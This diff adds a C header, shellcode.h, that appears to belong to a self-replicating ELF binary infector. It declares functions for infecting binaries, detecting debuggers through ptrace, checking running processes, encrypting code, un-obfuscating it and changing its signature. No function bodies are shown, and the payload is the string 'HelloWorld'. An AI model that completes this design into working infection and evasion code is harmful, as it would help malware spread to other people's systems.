@@ -1,0 +1,52 @@
+#ifndef SHELLCODE_H
+# define SHELLCODE_H
+
+# define _FCNTL_H
+# define _SYS_MMAN_H
+# include <linux/stat.h>
+# include <stddef.h>
+# include <sys/types.h>
+# include <bits/stat.h>
+# include <bits/fcntl.h>
+# include <bits/mman.h>
+# include <dirent.h>
+# include <elf.h>
+
+# define BUF_SIZE 1024 * 1024 * 5
+# define PAYLOAD "HelloWorld"
+# define MAX_INS_SIZE 12
+
+/* Architecture dependent */
+enum __ptrace_request {
+  PTRACE_TRACEME = 0,
+  PTRACE_ATTACH = 16
+};
+#define MAP_FAILED	((void *) -1)
+/* Architecture dependent */
+
+typedef off_t off64_t;
+typedef ino_t ino64_t;
+
+struct  linux_dirent64 {
+  ino64_t         d_ino;
+  off64_t         d_off;
+  unsigned short  d_reclen;
+  unsigned char   d_type;
+  char            d_name[];
+};
+
+static void updateSignature(void);
+static void dynamicSignature(void);
+static void end(void);
+static void lambdaEnd(void);
+static void lambdaStart(void);
+static void encryptStart(void);
+static int  preventDebug(void);
+static size_t strlen(const char *s);
+static int  checkProcess(char *dirname);
+static int  infectBins(const char *dirname);
+static void *memcpy(void *dest, const void *src, size_t);
+static int  unObfuscate(void);
+static int  stop(int status, void *magic);
+
+#endif
